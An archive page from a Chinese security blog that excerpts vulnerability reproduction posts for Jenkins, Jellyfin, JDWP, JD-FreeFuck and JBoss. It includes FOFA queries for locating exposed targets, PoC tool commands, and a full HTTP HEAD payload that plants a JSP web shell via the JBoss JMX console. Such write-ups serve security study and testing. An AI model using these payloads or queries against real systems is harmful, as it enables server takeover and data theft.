<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/68/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Jenkins/（CVE-2019-1003000）Jenkins 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2019-1003000%EF%BC%89Jenkins%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.948Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-1003000）Jenkins-远程代码执行漏洞"><a href="#（CVE-2019-1003000）Jenkins-远程代码执行漏洞" class="headerlink" title="（CVE-2019-1003000）Jenkins 远程代码执行漏洞"></a>（CVE-2019-1003000）Jenkins 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞存在于Declarative Plugin 1.3.4.1之前的版本, Groovy Plugin<br>2.61.1之前的版本以及 Script Security Plugin<br>1.50之前的版本。该漏洞通过将AST转换注释（如@Grab）应用于源代码元素，可以在脚本编译阶段避免脚本安全沙箱保护。所以会造成具有”Overall/Read”权限的用户或能够控制SCM中的Jenkinsfile或者sandboxed<br>Pipeline共享库内容的用户可以绕过沙盒保护并在Jenkins主服务器上执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Declarative Plugin &lt; 1.3.4.1</p>
<p>Groovy Plugin &lt; 2.61.1</p>
<p>Script Security Plugin &lt; 1.50</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>gitclone https://github.com/ianxtianxt/cve-2019-1003000-jenkins-rce-poc.git

cdcve-2019-1003000-jenkins-rce-poc

pipinstall -r requirements.txt

cdsample-vuln

./run.sh
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2019-1003000%EF%BC%89Jenkins%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jenkins/%EF%BC%88CVE-2019-1003000%EF%BC%89Jenkins%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrjx0099y8v10m014ypj" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jenkins/（CVE-2018-1000861）Jenkins 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2018-1000861%EF%BC%89Jenkins%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.945Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-1000861）Jenkins-远程命令执行漏洞"><a href="#（CVE-2018-1000861）Jenkins-远程命令执行漏洞" class="headerlink" title="（CVE-2018-1000861）Jenkins 远程命令执行漏洞"></a>（CVE-2018-1000861）Jenkins 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Jenkins使用Stapler框架开发，其允许用户通过URL<br>PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。</p>
<p>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jenkins Version &lt;= 2.56</p>
<p>Jenkins LTS Version &lt;= 2.46.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h4><h5 id="1-此漏洞是没有回显的-所以我们这里直接反弹shell"><a href="#1-此漏洞是没有回显的-所以我们这里直接反弹shell" class="headerlink" title="1.此漏洞是没有回显的,所以我们这里直接反弹shell:"></a>1.此漏洞是没有回显的,所以我们这里直接反弹shell:</h5>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2018-1000861%EF%BC%89Jenkins%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jenkins/%EF%BC%88CVE-2018-1000861%EF%BC%89Jenkins%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrjy009ay8v10x9ycosi" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jenkins/（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2017-1000353%EF%BC%89Jenkins-CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.943Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-1000353）Jenkins-CI-远程代码执行漏洞"><a href="#（CVE-2017-1000353）Jenkins-CI-远程代码执行漏洞" class="headerlink" title="（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞"></a>（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>所有Jenkins主版本均受到影响(包括&lt;=2.56版本)所有Jenkins LTS 均受到影响( 包括&lt;=2.46.1版本)</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="步骤一、生成序列化字符串"><a href="#步骤一、生成序列化字符串" class="headerlink" title="步骤一、生成序列化字符串"></a>步骤一、生成序列化字符串</h3><p>参考<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2017-1000353">https://github.com/ianxtianxt/CVE-2017-1000353</a>，首先下载<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar">CVE-2017-1000353-1.1-SNAPSHOT-all.jar</a>，这是生成POC的工具。</p>
<p>执行下面命令，生成字节码文件：</p>
<pre><code>java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser &quot;touch /tmp/success&quot;
# jenkins_poc.ser是生成的字节码文件名
# &quot;touch ...&quot;是待执行的任意命令
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2017-1000353%EF%BC%89Jenkins-CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jenkins/%EF%BC%88CVE-2017-1000353%EF%BC%89Jenkins-CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrjw0098y8v1dr0od1k7" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jenkins/Jenkins 功能未授权访问导致的远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jenkins/Jenkins%20%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.940Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jenkins功能未授权访问导致的远程命令执行漏洞"><a href="#Jenkins功能未授权访问导致的远程命令执行漏洞" class="headerlink" title="Jenkins功能未授权访问导致的远程命令执行漏洞"></a>Jenkins功能未授权访问导致的远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Jenkins管理登陆之后，后台”系统管理”功能，有个”脚本命令行的”功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上Jenkins正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对Jenkins系统服务器产生比较严重的影响和危害。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>找到”系统管理”——“脚本命令行”。</p>
<p><img src="/resource/Jenkins%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
<p><img src="/resource/Jenkins%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
<p>输入任意的Groovy脚本并在服务器上执行它。对于故障排除和诊断很有用。使用’println’命令查看输出（如果使用System.out，它将输出到服务器的标准输出，很难看到。）示例：</p>
<pre><code>println(Jenkins.instance.pluginManager.plugins)
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jenkins/Jenkins%20%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jenkins/Jenkins%20%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrjw0097y8v1hrj29uxp" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jellyfin/Jellyfin 任意文件读取漏洞 CVE-2021-21402" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/" class="article-date">
  <time datetime="2022-07-08T06:25:57.919Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jellyfin-任意文件读取漏洞-CVE-2021-21402"><a href="#Jellyfin-任意文件读取漏洞-CVE-2021-21402" class="headerlink" title="Jellyfin 任意文件读取漏洞 CVE-2021-21402"></a>Jellyfin 任意文件读取漏洞 CVE-2021-21402</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Jellyfin是一个免费软件媒体系统。在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。当Windows用作主机OS时，此问题更为普遍。暴露于公共Internet的服务器可能会受到威胁。在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问，但是建议尽快进行更新。</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
<p>[!NOTE]</p>
<p>Jellyfin &lt; 10.7.1</p>
</blockquote>
<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
<p>[!NOTE]</p>
<p>title=’Jellyfin’ || body=’<a target="_blank" rel="noopener" href="http://jellyfin.media&/#39;">http://jellyfin.media&#39;</a></p>
</blockquote>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>无论是<code>/Audio/&#123;Id&#125;/hls/&#123;segmentId&#125;/stream.mp3</code>和<code>/Audio/&#123;Id&#125;/hls/&#123;segmentId&#125;/stream.aac</code>路线允许任意文件在Windows上读取。可以<code>&#123;segmentId&#125;</code>使用Windows路径分隔符<code>\</code>（对<code>%5C</code>URL进行编码）将路由的一部分设置为相对或绝对路径。最初，攻击者似乎只能读取以<code>.mp3</code>和<code>.aac</code>结尾的文件。但是，通过在URL路径中使用斜杠</p>
<p>Path.GetExtension(Request.Path)<code>返回一个空扩展名，从而获得对结果文件路径的完全控制。的</code>itemId，因为它没有使用也没有关系。该问题不仅限于Jellyfin文件，因为它允许从文件系统读取任何文件。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/" data-id="cl5c2qrjz009dy8v18zg8bk1i" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-JDWP/JDWP 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.875Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JDWP-远程代码执行漏洞"><a href="#JDWP-远程代码执行漏洞" class="headerlink" title="JDWP 远程代码执行漏洞"></a>JDWP 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>　JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java Platform<br>Debugger Architecture）中，它定义了调试器（debugger）和被调试的 Java<br>虚拟机（target vm）之间的通信协议。与PHP的 Xdebug<br>类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>开启了JDWP服务的主机。</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="利用dnslog确定可以执行命令："><a href="#利用dnslog确定可以执行命令：" class="headerlink" title="利用dnslog确定可以执行命令："></a>利用dnslog确定可以执行命令：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png">执行结果：<img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="2.png"></p>
<h3 id="生成msf后门文件，并将其放入自己的web目录下："><a href="#生成msf后门文件，并将其放入自己的web目录下：" class="headerlink" title="生成msf后门文件，并将其放入自己的web目录下："></a>生成msf后门文件，并将其放入自己的web目录下：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="3.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrl1009py8v1h6tedyds" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-JD-FreeFuck/JD-FreeFuck后台命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.846Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JD-FreeFuck-后台命令执行漏洞"><a href="#JD-FreeFuck-后台命令执行漏洞" class="headerlink" title="JD-FreeFuck 后台命令执行漏洞"></a>JD-FreeFuck 后台命令执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有对内容过滤，导致可以执行任意命令，控制服务器</p>
<p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/meselson/JD-FreeFuck">https://github.com/meselson/JD-FreeFuck</a></p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p><code>JD-FreeFuck</code></p>
<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><p><code>title=&quot;京东薅羊毛控制面板&quot;</code></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问后登录页面如下</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrjv0095y8v158n7cowr" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jboss/访问控制不严导致的漏洞/（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2010-0738%EF%BC%89JBoss%20JMX%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:57.789Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2010-0738）JBoss-JMX控制台安全验证绕过漏洞"><a href="#（CVE-2010-0738）JBoss-JMX控制台安全验证绕过漏洞" class="headerlink" title="（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞"></a>（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>这个漏洞利用方法跟CVE-2007-1036一样，不过这个是绕过了get和post传输限制，利用head传输方式发送payload</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>jboss4.2.0 and jboss 4.3.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>因为跟上个漏洞利用差不多，只不过用了head传输方式，我这里就直接贴payload了</p>
<pre><code>HEAD /jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=6&amp;arg0=..%2Fjmx-console.war%2F&amp;arg1=hax0rwin&amp;arg2=.jsp&amp;arg3=&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;&amp;arg4=True HTTP/1.1

Host: hostx:portx

User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-us,en;q=0.5

Accept-Encoding: gzip,deflate

Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7

Keep-Alive: 300

Proxy-Connection: keep-alive
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2010-0738%EF%BC%89JBoss%20JMX%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2010-0738%EF%BC%89JBoss%20JMX%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qru000b0y8v141j1hc3r" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jboss/访问控制不严导致的漏洞/（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2007-1036%EF%BC%89JBoss%20JMX%20Console%20HtmlAdaptor%20Getshell/" class="article-date">
  <time datetime="2022-07-08T06:25:57.787Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2007-1036）JBoss-JMX-Console-HtmlAdaptor-Getshell"><a href="#（CVE-2007-1036）JBoss-JMX-Console-HtmlAdaptor-Getshell" class="headerlink" title="（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell"></a>（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中jboss.admin<br>-&gt; DeploymentFileRepository -&gt;<br>store()方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。但是通过实验发现，arg1和arg2可以进行文件的拼接，例如arg1=she，arg2=ll.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>全版本</p>
